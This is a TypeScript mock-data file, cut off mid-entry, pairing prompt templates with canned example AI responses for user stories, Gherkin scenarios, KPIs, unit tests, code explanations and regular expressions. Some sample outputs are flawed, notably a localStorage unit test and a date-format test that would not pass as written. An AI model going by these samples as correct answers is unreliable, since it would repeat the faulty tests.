/* eslint-disable */
export const MOCK_DATA_IDS = [
  '--collection-main--category-studios--subcategory-digital--subcategory_level_2-product--',
  '--collection-main--category-studios--subcategory-digital--subcategory_level_2-ui-engineering--',
  '--collection-main--category-studios--subcategory-digital--subcategory_level_2-scalable-platforms--',
];
export const getUserStoryRequest = (content: string)=> [
  {
    content: 'Respond as if you were a product owner. Create a User Story this format: 1. Title of the User Story 2. Description with the format "as a user" and Feature and at least 3 Scenario using Gherking. 3.Acceptance criteria 4. Story point and explain why. 5. topics to discuss. 6. Additional Documentation. 7. Unhappy path. 8. Business Value (tangible and intangible benefics a business can get from the capabilities of a product)',
    role: 'system',
  },
  {
    content: `create a user story for ${content}`,
    role: 'user',
  },
];

export const MARKDOWN_EXAMPLE = '## User Story: Login Functionality\n\nAs a user, I want to be able to login to the system so that I can access my account and utilize the features of the application.\n\n### Acceptance Criteria:\n\n- As a user, I can see a login screen with fields for entering my email and password.\n- As a user, I can enter valid credentials and click the login button to access my account.\n- As a user, I receive an error message if I enter invalid credentials.\n- As a user, I can click on the forgot password link to reset my password in case I forget it.\n- As a user, I can login using my social media accounts like Google, Facebook, and LinkedIn.\n- As a product owner, I can see a record of successful and unsuccessful login attempts for users.';
export const MOCK_DATA = [
  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-product--',
    mode: [
      {
        shortTitle: 'US',
        title: 'User Story',
        examples: [
          {
            request: [
              {
                content: 'Respond as if you were a product owner',
                role: 'system',
              },
              {
                content: 'create a user story for login',
                role: 'user',
              },
            ],
            response: {
              content:
                'As a user, I want to be able to log into my account so that I can access my personalized content and settings. I should be able to enter my username and password, and then receive confirmation that I have successfully logged in. If I enter incorrect login credentials, I should be prompted to try again or reset my password. Additionally, I should be able to remain logged in if I close and reopen the app or website, but have the option to log out if I need to.',
            },
          },
          {
            request: [
              {
                content: 'Respond as if you were a product owner',
                role: 'system',
              },
              {
                content: 'create a user story for add product to the cart',
                role: 'user',
              },
            ],
            response: {
              content:
                'As a shopper, I want to be able to add products to my shopping cart so that I can easily keep track of the items I want to purchase and proceed to checkout when I\'m ready. When I browse through the website, I should be able to find a button or link next to each product that allows me to add it to the cart. Once I click on the button, the selected product should be logged in my cart and I should be able to view the total price of my selected items. Additionally, I should be able to add multiple quantities of the same product or remove products from the cart if I change my mind.',
            },
          },
        ],
      },

      {
        shortTitle: 'GH',
        title: 'US Gherkin',
        examples: [
          {
            request: [
              {
                content: 'Respond using Gherking and Feature and scenario',
                role: 'system',
              },
              {
                content: 'create a user story for login',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n**Feature:** Login functionality \n\nAs a registered user of the system, I want to be able to log in with my username and password in order to access the system.\n\n**Scenario 1:** Successful login\n\nGiven I am on the homepage\nWhen I click on the "Login" button\nAnd I enter my username and password\nAnd I click on the "Login" button\nThen I should be redirected to my account page.\n\n**Scenario 2:** Unsuccessful login\n\nGiven I am on the homepage\nWhen I click on the "Login" button\nAnd I enter an invalid username or password\nAnd I click on the "Login" button\nThen I should see an error message indicating that my login credentials are incorrect.\n\n**Scenario 3:** Forgotten password\n\nGiven I am on the login page\nWhen I click on the "Forgot password" link\nAnd I enter my email address\nAnd I click on the "Reset password" button\nThen I should receive an email with instructions on how to reset my password.',
            },
          },
          {
            request: [
              {
                content: 'Respond using Gherking and Feature and scenario',
                role: 'system',
              },
              {
                content: 'create a user story for add product to the cart',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nFeature: Add product to cart\nScenario: Add a product to the cart\nGiven I am on the product\'s page\nWhen I select "Add to Cart"\nThen the product is added to my cart\nAnd I see a notification that the product has been added to my cart. \n\nScenario: Increase product quantity in cart\nGiven I have added a product to my cart\nWhen I increase the quantity of the product in my cart\nThen the quantity of the product is updated in my cart\n\nScenario: Remove product from cart\nGiven I have added a product to my cart\nWhen I select "remove" button for the product in my cart\nThen the product is removed from my cart\nAnd the updated cart reflects the removal of the product.',
            },
          },
        ],
      },
      {
        shortTitle: 'AC',
        title: 'Acceptance Criteria',
        examples: [
          {
            request: [
              {
                content: 'Respond the acceptance criteria for the next US, it must be very specific',
                role: 'system',
              },
              {
                content: 'create a user story for login',
                role: 'user',
              },
            ],
            response: {
              content:
                'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.\n\nAcceptance criteria:\n- The user needs to be able to navigate to the login screen from the landing page.\n- The user needs to be able to input their email and password into the appropriate fields.\n- Upon successful login, the user should be redirected to the home page of the application.\n- The user should receive an error message if their email or password is incorrect.\n- The application should remember the user\'s login credentials and keep them logged in after closing and re-opening the application.\n- There should be a "Forgot Password" option that allows users to reset their password through email verification.\n- The user\'s password should be securely encrypted and stored in a database.\n- The login feature should be tested thoroughly to ensure that it works in all supported browsers and under different network conditions.',
            },
          },
          {
            request: [
              {
                content: 'Respond the acceptance criteria for the next US, it must be very specific',
                role: 'system',
              },
              {
                content: 'create a user story for add product to the cart',
                role: 'user',
              },
            ],
            response: {
              content:
                'As a customer, I want to be able to add a product to my cart so that I can purchase it later.\n\nAcceptance Criteria:\n1. When a user clicks on the "Add to Cart" button, the product should be added to the cart.\n2. The cart should display the updated number of items and the total cost of the items added.\n3. The user should be able to add multiple items to the cart.\n4. The user should be able to remove items from the cart.\n5. The user should be able to update the quantity of a particular item in the cart.\n6. If a user tries to add a product to the cart that is out of stock, an appropriate error message should be displayed.\n7. If a user tries to add a product to the cart that is already in the cart, the cart should update the quantity of the item.\n8. The cart should be accessible from any page on the website.\n9. The user should be able to proceed to checkout from the cart page.',
            },
          },
        ],
      },
      {
        shortTitle: 'SP',
        title: 'Story Points',
        examples: [
          {
            request: [
              {
                content: 'Respond the story points for the next User Story',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                'I would estimate this user story to be a 3 in story points. While it is an essential feature for any application that requires authentication, it is a relatively straightforward task that can be completed in a few hours. However, if there are additional requirements such as integrating with a third-party authentication provider or implementing two-factor authentication, then the story points may increase.',
            },
          },
          {
            request: [
              {
                content: 'Respond the story points for the next User Story',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                'The story points for this user story would depend on the complexity of the implementation. However, based on the given information, I would estimate that this user story could be completed in 2 to 5 story points, assuming the following:\n\n- The website already has some basic functionality for adding products to a cart.\n- The implementation involves adding a simple "Add to Cart" button to each product page and updating the cart count and total cost appropriately.\n- No complex business rules or integration with external systems are required.',
            },
          },
        ],
      },
      {
        shortTitle: 'AB',
        title: 'A/B Testing',
        examples: [
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                'A/B testing: \n\nA) Traditional login method where users enter their email and password into a login form and click a button to authenticate their credentials.\n\nB) Social media login method where users can choose to log in using their social media account credentials (e.g. Facebook, Google, Twitter). \n\nThe A/B testing will measure which method generates more logins, higher user engagement, and user satisfaction.',
            },
          },
          {
            request: [
              {
                content: 'Respond with a A/B testing for the next User Story',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                'As an A/B testing variation for this user story, we can test the placement and design of the "Add to Cart" button. In variation A, the "Add to Cart" button can be placed prominently in the center of the product page with a contrasting color to make it stand out. This could help attract the user\'s attention and make it easier for them to add products to their cart.\n\nIn variation B, we could move the "Add to Cart" button to a less prominent location, such as in the corner of the product page. This could test if users are more likely to add products to their cart if they have to actively search for the button, rather than having it prominently displayed.\n\nWe can then track metrics such as the number of products added to the cart, the click-through rate on the "Add to Cart" button, and the conversion rate to determine which variation is more effective.',
            },
          },
        ],
      },
      {
        shortTitle: 'KM',
        title: 'KPI',
        examples: [
          {
            request: [
              {
                content: 'What are the key performance metrics for the next UX',
                role: 'system',
              },
              {
                content:
                  'As a user, I want to be able to log into the application with my email and password so that I can access all of the features that require authentication.',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThe key performance metrics for the next UX iteration focusing on the log-in feature could include:\n\n1. Conversion rate: Measure the percentage of users who successfully log in after entering their email and password. This will help determine whether the log-in process is smooth and user-friendly.\n\n2. Error rate: Measure the frequency and type of errors users experience when attempting to log in. With this metric, you can identify areas of the log-in process that may be causing confusion or frustration for users.\n\n3. Time to complete: Measure the amount of time it takes users to log in, from entering their email and password to accessing the app\'s features. If it takes too long to complete the log-in process, users may abandon the app entirely.\n\n4. User engagement: Measure the number of times users access the app\'s features and functions after successfully logging in. This indicates whether the log-in process is not only successful but also encourages users to continue using the app.\n\nBy tracking these metrics, you can identify areas for improvement in the log-in process and ensure that the UX delivers the best possible experience for users.',
            },
          },
          {
            request: [
              {
                content: 'What are the key performance metrics for the next UX',
                role: 'system',
              },
              {
                content: 'As a customer, I want to be able to add a product to my cart so that I can purchase it later',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nHere are some key performance metrics for the next UX related to adding a product to the cart:\n\n1. Conversion rate: This measures the percentage of users who successfully add a product to their cart and go on to complete their purchase. A high conversion rate indicates a smooth and intuitive cart experience.\n\n2. Cart abandonment rate: This measures the percentage of users who add a product to their cart but do not complete their purchase. A low cart abandonment rate indicates a frictionless cart experience.\n\n3. Time to add a product: This measures the time it takes for a user to add a product to their cart. A quick and easy process will result in a shorter time to add a product.\n\n4. Cart accuracy: This measures the accuracy of cart item pricing, quantity, and availability to ensure that users are not surprised when they get to the checkout page.\n\n5. User satisfaction: This measures how satisfied users are with the cart experience overall through surveys, feedback, or Net Promoter Score (NPS) to identify areas of improvement.',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-ui-engineering--',
    mode: [
      {
        shortTitle: 'UT',
        title: 'Unit Test',
        examples: [
          {
            request: [
              {
                content: 'Reply only the Unit Test for the next code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content:
                  '```\n// get user input\nlet name = document.getElementById("nameInput").value;\nlet email = document.getElementById("emailInput").value;\nlet age = document.getElementById("ageInput").value;\n\n// save data to local storage\nlocalStorage.setItem("name", name);\nlocalStorage.setItem("email", email);\nlocalStorage.setItem("age", age);\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\ndescribe("localStorage", () => {\n  test("it should save name, email and age to local storage", () => {\n    // Arrange\n    const nameInput = document.createElement("input");\n    const emailInput = document.createElement("input");\n    const ageInput = document.createElement("input");\n    const expectedName = "John";\n    const expectedEmail = "john@example.com";\n    const expectedAge = "30";\n\n    nameInput.setAttribute("id", "nameInput");\n    emailInput.setAttribute("id", "emailInput");\n    ageInput.setAttribute("id", "ageInput");\n\n    nameInput.value = expectedName;\n    emailInput.value = expectedEmail;\n    ageInput.value = expectedAge;\n\n    document.body.appendChild(nameInput);\n    document.body.appendChild(emailInput);\n    document.body.appendChild(ageInput);\n\n    // Act\n    localStorage.clear();\n\n    document.getElementById("nameInput").dispatchEvent(new Event("input", { bubbles: true }));\n    document.getElementById("emailInput").dispatchEvent(new Event("input", { bubbles: true }));\n    document.getElementById("ageInput").dispatchEvent(new Event("input", { bubbles: true }));\n\n    const actualName = localStorage.getItem("name");\n    const actualEmail = localStorage.getItem("email");\n    const actualAge = localStorage.getItem("age");\n\n    // Assert\n    expect(actualName).toBe(expectedName);\n    expect(actualEmail).toBe(expectedEmail);\n    expect(actualAge).toBe(expectedAge);\n  });\n});\n```',
            },
          },
          {
            request: [
              {
                content: 'Reply only the Unit Test for the next code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'function convertToFahrenheit(degrees) {\n  return (degrees * 9/5) + 32;\n}',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\ndescribe("convertToFahrenheit", () => {\n  it("converts 0 degrees Celsius to 32 Fahrenheit", () => {\n    expect(convertToFahrenheit(0)).toBe(32);\n  });\n\n  it("converts 100 degrees Celsius to 212 Fahrenheit", () => {\n    expect(convertToFahrenheit(100)).toBe(212);\n  });\n\n  it("converts -40 degrees Celsius to -40 Fahrenheit", () => {\n    expect(convertToFahrenheit(-40)).toBe(-40);\n  });\n\n  it("converts 37 degrees Celsius to 98.6 Fahrenheit", () => {\n    expect(convertToFahrenheit(37)).toBeCloseTo(98.6);\n  });\n});\n```',
            },
          },
        ],
      },

      {
        shortTitle: 'CD',
        title: 'Create Code',
        examples: [
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'in java script save the next data on local storage (name, age, email and token)',
                role: 'user',
              },
            ],
            response: {
              content:
                'localStorage.setItem("name", "John");\nlocalStorage.setItem("age", "30");\nlocalStorage.setItem("email", "john@gmail.com");\nlocalStorage.setItem("token", "abc123");',
            },
          },
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'write a Java Script appp to ask for a decimal number and convert it to roman numerals',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\nlet decimalNumber = prompt("Enter a decimal number:"); \nlet num = decimalNumber; \nlet romanNumerals = ["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"]; \nlet decimalValue = [1000,900,500,400,100,90,50,40,10,9,5,4,1]; \nlet romanNumber = ""; \n\nfor(let i=0; i<decimalValue.length;i++){\n  while(decimalValue[i]<=num){ \n    romanNumber += romanNumerals[i]; \n    num -= decimalValue[i]; \n  }\n}\n\nconsole.log(decimalNumber + " in roman numerals is: " + romanNumber);\n```',
            },
          },
        ],
      },
      {
        shortTitle: 'EC',
        title: 'Explain Code',
        examples: [
          {
            request: [
              {
                content: 'Explain me the next code as a developer',
                role: 'system',
              },
              {
                content:
                  'localStorage.setItem("name", "John");\nlocalStorage.setItem("age", "30");\nlocalStorage.setItem("email", "john@gmail.com");\nlocalStorage.setItem("token", "abc123");',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis code uses the localStorage object, which is a feature of the web browser used to store data on the browser\'s end. It sets four key-value pairs of data in localStorage.\n\nThe first line sets a key "name" with a value "John". It can be thought of as storing the name "John" along with a label "name" in the browser\'s internal storage. Similarly, the second line stores the age of the user as the value along with a label "age" in the storage.\n\nThe third line sets the email of the user as the value and the label "email" in the storage. The fourth line sets a token value as the value and the label "token" in the storage.\n\nThis way, the data will be stored in the browser until it is cleared from the browser\'s storage or the user manually deletes it. The data can be retrieved by using the key to get the value from localStorage.',
            },
          },
          {
            request: [
              {
                content: 'Explain me the next code as a developer',
                role: 'system',
              },
              {
                content:
                  '\n\n```\nlet decimalNumber = prompt("Enter a decimal number:"); \nlet num = decimalNumber; \nlet romanNumerals = ["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"]; \nlet decimalValue = [1000,900,500,400,100,90,50,40,10,9,5,4,1]; \nlet romanNumber = ""; \n\nfor(let i=0; i<decimalValue.length;i++){\n  while(decimalValue[i]<=num){ \n    romanNumber += romanNumerals[i]; \n    num -= decimalValue[i]; \n  }\n}\n\nconsole.log(decimalNumber + " in roman numerals is: " + romanNumber);\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                'This script prompts the user to enter a decimal number and then converts that number to its equivalent in Roman numerals. \n\nThe inputted decimal number is stored as a variable named `decimalNumber`. Another variable named `num` is assigned the same value as `decimalNumber`.\n\nTwo arrays are then initialized, namely `romanNumerals` and `decimalValue`. The `romanNumerals` array holds the different Roman numerals that will be used to represent different decimal values. The `decimalValue` array holds the actual decimal values that the Roman numerals in `romanNumerals` array represent.\n\nAn empty string is declared and assigned to the variable named `romanNumber` which will hold the final Roman numeral.\n\nIn the loop, `decimalValue` array is used to check if the current value `num` is greater than or equal to the decimal value at the current index of `decimalValue`. If true, the corresponding Roman numeral from the `romanNumerals` array is added to the `romanNumber` string, and `num` is reduced by the decimal value at the current index. This process continues until `num` becomes zero.\n\nFinally, `console.log()` is called to display the original `decimalNumber` and its equivalent `romanNumber`.',
            },
          },
        ],
      },
      {
        shortTitle: 'CD',
        title: 'Code Documentation',
        examples: [
          {
            request: [
              {
                content: 'Create documentation for the next code',
                role: 'system',
              },
              {
                content:
                  'localStorage.setItem("name", "John");\nlocalStorage.setItem("age", "30");\nlocalStorage.setItem("email", "john@gmail.com");\nlocalStorage.setItem("token", "abc123");',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n## localStorage.setItem()\n\nThe `localStorage.setItem()` method allows a key-value pair to be stored in the browser\'s localStorage object.\n\n### Syntax\n```javascript\nlocalStorage.setItem(key, value);\n```\n\n- `key` : The key of the data to be stored. It is of string type.\n- `value` : The value of the data to be stored. It is of string type.\n\n\n## Parameters\n\n#### key\nA string containing the name of the key used to store the data.\n\n#### value\nA string containing the value to store under the given key.\n\n\n## Usage\n\nThe code snippet creates four items in the localStorage object.\n\n```javascript\nlocalStorage.setItem("name", "John");\nlocalStorage.setItem("age", "30");\nlocalStorage.setItem("email", "john@gmail.com");\nlocalStorage.setItem("token", "abc123");\n```\n\nThe above code creates the following key-value pairs in localStorage.\n\n"age" -> "30" \\\n"name" -> "John" \\\n"email" -> "john@gmail.com" \\\n"token" -> "abc123" \n\nWe can now retrieve this data later using localStorage.getItem() method by using the corresponding keys. \n\n```javascript\nlocalStorage.getItem("name"); // returns "John"\nlocalStorage.getItem("age"); // returns "30"\nlocalStorage.getItem("email"); // returns "john@gmail.com"\nlocalStorage.getItem("token"); // returns "abc123"\n```\n\n## Note\n\nUsing the same key again to set the value in the localStorage object will override the previous value.',
            },
          },
          {
            request: [
              {
                content: 'Create documentation for the next code',
                role: 'system',
              },
              {
                content:
                  '\n\n```\nlet decimalNumber = prompt("Enter a decimal number:"); \nlet num = decimalNumber; \nlet romanNumerals = ["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"]; \nlet decimalValue = [1000,900,500,400,100,90,50,40,10,9,5,4,1]; \nlet romanNumber = ""; \n\nfor(let i=0; i<decimalValue.length;i++){\n  while(decimalValue[i]<=num){ \n    romanNumber += romanNumerals[i]; \n    num -= decimalValue[i]; \n  }\n}\n\nconsole.log(decimalNumber + " in roman numerals is: " + romanNumber);\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n# Decimal to Roman Numeral Converter\n\nThis code is a JavaScript program that converts a decimal (base 10) number to a Roman numeral. The program takes a decimal number from the user as input using the prompt function in JavaScript. The decimal number is then stored in the variable decimalNumber.\n\nTwo arrays are defined in the program, romanNumerals and decimalValue. The romanNumerals array contains the Roman numeral symbols and the decimalValue array contains the corresponding decimal values.\n\nThe program then initializes the num variable to the value of decimalNumber and the romanNumber variable to an empty string.\n\nNext, a for loop is used to iterate through the decimalValue array. Within the loop, a while loop is used to add the corresponding Roman numeral to the romanNumber variable while the decimal value is less than or equal to the num value.\n\nAfter the for loop completes, the program prints the original decimal number entered by the user along with the converted Roman numeral string.\n\n### Example\n\n```\nEnter a decimal number: 1234\n1234 in roman numerals is: MCCXXXIV\n```\n\nThis program can be useful whenever you need to convert a decimal number to Roman numerals.',
            },
          },
        ],
      },
      {
        shortTitle: 'RE',
        title: 'Regular Expression',
        examples: [
          {
            request: [
              {
                content: 'Only write the regular expression with no explanation.',
                role: 'system',
              },
              {
                content: 'Write a regular expression that extracts all dates from a text file.',
                role: 'user',
              },
            ],
            response: {
              content: '\\d{1,2}/\\d{1,2}/\\d{4}',
            },
          },
          {
            request: [
              {
                content: 'Only write the regular expression with no explanation.',
                role: 'system',
              },
              {
                content:
                  'Write a regular expression that the username can contain letters, numbers, underscores, and dots. The username must start with a letter or a number. The domain can contain letters, numbers, underscores, and dots. The domain must have at least one dot and have a valid domain extension of 2 to 6 characters.',
                role: 'user',
              },
            ],
            response: {
              content: '^[a-zA-Z0-9][a-zA-Z0-9_.]*@[a-zA-Z0-9_.]+\\.[a-zA-Z]{2,6}$',
            },
          },
        ],
      },
      {
        shortTitle: 'RE',
        title: 'REGEX Explain',
        examples: [
          {
            request: [
              {
                content: 'Explain me this regular expression',
                role: 'system',
              },
              {
                content: 'Regular Expression (\\d{1,2}/\\d{1,2}/\\d{4})',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis regular expression matches a date string in the format of MM/DD/YYYY, where:\n\n- \\d{1,2} matches one or two digits representing the month (MM).\n- / matches a forward-slash character between the month and day.\n- \\d{1,2} matches one or two digits representing the day (DD).\n- / matches another forward-slash character between the day and year.\n- \\d{4} matches four digits representing the year (YYYY).\n\nOverall, this regular expression matches a wide range of possible dates, allowing for single or double-digit months and days, and four-digit years.',
            },
          },
          {
            request: [
              {
                content: 'Explain me this regular expression',
                role: 'system',
              },
              {
                content: 'Regular Expression (^[a-zA-Z0-9][a-zA-Z0-9_.]*@[a-zA-Z0-9_.]+\\.[a-zA-Z]{2,6}$)',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis regular expression matches a valid email address with the following conditions:\n\n- ^ and $ indicate the start and end of the string respectively, ensuring that the entire string matches the pattern.\n- [a-zA-Z0-9] matches a single character that can be any uppercase or lowercase alphabet or any digit.\n- [a-zA-Z0-9_.]* matches zero or more characters which can be either uppercase or lowercase alphabet, any digit, underscore (_), or dot (.)\n- @ matches a literal at sign.\n- [a-zA-Z0-9_.]+ matches one or more characters which can be either uppercase or lowercase alphabet, any digit, underscore (_), or dot (.)\n- \\. matches a literal dot.\n- [a-zA-Z]{2,6} matches any two to six uppercase or lowercase alphabets at the end of the string, specifying the top-level domain.\n\nPut together, this expression matches valid email addresses with one or more alphanumeric characters, followed by an @ symbol, an alphanumeric domain name with optional periods and underscores, and a valid top-level domain ending in two to six alphabets.',
            },
          },
        ],
      },
      {
        shortTitle: 'DC',
        title: 'Debug Code',
        examples: [
          {
            request: [
              {
                content: 'is the following code correct? if not, tell me what\'s wrong.',
                role: 'system',
              },
              {
                content: 'X=7 \nif x = 7 \n print(\'this number is 7\') \n else: \n print(\'this number is not 7\')',
                role: 'user',
              },
            ],
            response: {
              content:
                'No, the code is not correct. There are a few errors: \n\n1. The variable name is inconsistent. In the first line, it\'s `X` (capital) but in the if statement, it\'s `x` (lowercase). Variable names are case-sensitive in Python, so you need to be consistent. \n\n2. The if statement needs a colon (`:`) at the end. \n\n3. The comparison operator used in the if statement is the assignment operator (`=`) instead of the equality operator (`==`). \n\nHere\'s the corrected code: \n\n```\nx = 7\nif x == 7:\n    print(\'this number is 7\')\nelse:\n    print(\'this number is not 7\')\n```',
            },
          },
          {
            request: [
              {
                content: 'is the following code correct? if not, tell me what\'s wrong.',
                role: 'system',
              },
              {
                content: 'X=7 \nif x = 7 \n print(\'this number is 7\') \n else: \n print(\'this number is not 7\')',
                role: 'user',
              },
            ],
            response: {
              content:
                'No, the code is not correct. There are a few errors: \n\n1. The variable name is inconsistent. In the first line, it\'s `X` (capital) but in the if statement, it\'s `x` (lowercase). Variable names are case-sensitive in Python, so you need to be consistent. \n\n2. The if statement needs a colon (`:`) at the end. \n\n3. The comparison operator used in the if statement is the assignment operator (`=`) instead of the equality operator (`==`). \n\nHere\'s the corrected code: \n\n```\nx = 7\nif x == 7:\n    print(\'this number is 7\')\nelse:\n    print(\'this number is not 7\')\n```',
            },
          },
        ],
      },
    ],
  },

  {
    type: '--collection-main--category-studios--subcategory-digital--subcategory_level_2-scalable-platforms--',
    mode: [
      {
        shortTitle: 'UT',
        title: 'Unit Test',
        examples: [
          {
            request: [
              {
                content: 'Reply only the Unit Test for the next code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content:
                  'var today = new Date();\nvar formattedDate = today.getFullYear() + \'-\' + (today.getMonth()+1) + \'-\' + today.getDate();\nconsole.log(formattedDate);',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\n// Unit Test\ndescribe("formattedDate", () => {\n  it("should return the formatted date string yyyy-mm-dd", () => {\n    // Setup\n    const today = new Date();\n    const expectedYear = today.getFullYear().toString();\n    const expectedMonth = (today.getMonth() + 1).toString().padStart(2, "0");\n    const expectedDay = today.getDate().toString().padStart(2, "0");\n    const expectedFormattedDate =\n      expectedYear + "-" + expectedMonth + "-" + expectedDay;\n\n    // Execution\n    const formattedDate = today.getFullYear() + \'-\' + (today.getMonth() + 1) + \'-\' + today.getDate();\n\n    // Assertion\n    expect(formattedDate).toEqual(expectedFormattedDate);\n  });\n});\n```',
            },
          },
          {
            request: [
              {
                content: 'Reply only the Unit Test for the next code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'function convertToFahrenheit(degrees) {\n  return (degrees * 9/5) + 32;\n}',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\ndescribe("convertToFahrenheit", () => {\n  it("converts 0 degrees Celsius to 32 Fahrenheit", () => {\n    expect(convertToFahrenheit(0)).toBe(32);\n  });\n\n  it("converts 100 degrees Celsius to 212 Fahrenheit", () => {\n    expect(convertToFahrenheit(100)).toBe(212);\n  });\n\n  it("converts -40 degrees Celsius to -40 Fahrenheit", () => {\n    expect(convertToFahrenheit(-40)).toBe(-40);\n  });\n\n  it("converts 37 degrees Celsius to 98.6 Fahrenheit", () => {\n    expect(convertToFahrenheit(37)).toBeCloseTo(98.6);\n  });\n});\n```',
            },
          },
        ],
      },

      {
        shortTitle: 'CD',
        title: 'Create Code',
        examples: [
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'How to format (\' yyyy-MM-dd \') in JavaScript',
                role: 'user',
              },
            ],
            response: {
              content:
                'var today = new Date();\nvar formattedDate = today.getFullYear() + \'-\' + (today.getMonth()+1) + \'-\' + today.getDate();\nconsole.log(formattedDate);',
            },
          },
          {
            request: [
              {
                content: 'just write code and nothing else. Do not write explanations.',
                role: 'system',
              },
              {
                content: 'write a Java Script appp to ask for a decimal number and convert it to roman numerals',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\n```\nlet decimalNumber = prompt("Enter a decimal number:"); \nlet num = decimalNumber; \nlet romanNumerals = ["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"]; \nlet decimalValue = [1000,900,500,400,100,90,50,40,10,9,5,4,1]; \nlet romanNumber = ""; \n\nfor(let i=0; i<decimalValue.length;i++){\n  while(decimalValue[i]<=num){ \n    romanNumber += romanNumerals[i]; \n    num -= decimalValue[i]; \n  }\n}\n\nconsole.log(decimalNumber + " in roman numerals is: " + romanNumber);\n```',
            },
          },
        ],
      },
      {
        shortTitle: 'EC',
        title: 'Explain Code',
        examples: [
          {
            request: [
              {
                content: 'Explain me the next code as a developer',
                role: 'system',
              },
              {
                content:
                  'localStorage.setItem("name", "John");\nlocalStorage.setItem("age", "30");\nlocalStorage.setItem("email", "john@gmail.com");\nlocalStorage.setItem("token", "abc123");',
                role: 'user',
              },
            ],
            response: {
              content:
                '\n\nThis code uses the localStorage object, which is a feature of the web browser used to store data on the browser\'s end. It sets four key-value pairs of data in localStorage.\n\nThe first line sets a key "name" with a value "John". It can be thought of as storing the name "John" along with a label "name" in the browser\'s internal storage. Similarly, the second line stores the age of the user as the value along with a label "age" in the storage.\n\nThe third line sets the email of the user as the value and the label "email" in the storage. The fourth line sets a token value as the value and the label "token" in the storage.\n\nThis way, the data will be stored in the browser until it is cleared from the browser\'s storage or the user manually deletes it. The data can be retrieved by using the key to get the value from localStorage.',
            },
          },
          {
            request: [
              {
                content: 'Explain me the next code as a developer',
                role: 'system',
              },
              {
                content:
                  '\n\n```\nlet decimalNumber = prompt("Enter a decimal number:"); \nlet num = decimalNumber; \nlet romanNumerals = ["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"]; \nlet decimalValue = [1000,900,500,400,100,90,50,40,10,9,5,4,1]; \nlet romanNumber = ""; \n\nfor(let i=0; i<decimalValue.length;i++){\n  while(decimalValue[i]<=num){ \n    romanNumber += romanNumerals[i]; \n    num -= decimalValue[i]; \n  }\n}\n\nconsole.log(decimalNumber + " in roman numerals is: " + romanNumber);\n```',
                role: 'user',
              },
            ],
            response: {
              content:
                'This script prompts the user to enter a decimal number and then converts that number to its equivalent in Roman numerals. \n\nThe inputted decimal number is stored as a variable named `decimalNumber`. Another variable named `num` is assigned the same value as `decimalNumber`.\n\nTwo arrays are then initialized, namely `romanNumerals` and `decimalValue`. The `romanNumerals` array holds the different Roman numerals that will be used to represent different decimal values. The `decimalValue` array holds the actual decimal values that the Roman numerals in `romanNumerals` array represent.\n\nAn empty string is declared and assigned to the variable named `romanNumber` which will hold the final Roman numeral.\n\nIn the loop, `decimalValue` array is used to check if the current value `num` is greater than or equal to the decimal value at the current index of `decimalValue`. If true, the corresponding Roman numeral from the `romanNumerals` array is added to the `romanNumber` string, and `num` is reduced by the decimal value at the current index. This process continues until `num` becomes zero.\n\nFinally, `console.log()` is called to display the original `decimalNumber` and its equivalent `romanNumber`.',
            },
          },
        ],
      },
      {
        shortTitle: 'CD',
        title: 'Code Documentation',
        examples: [
          {
            request: [
              {
                content: 'Create documentation for the next code',
                role: 'system',
              },
              {
                content:
                  'localStorage.setItem("name", "John");\nlocalStorage.setItem("age", "30");\nlocalStorage.setItem("email", "john@gmail.com");\nlocalStorage.setItem("token", "abc123");',
                role: 'user',
              },
            ],
            response: {
              content:
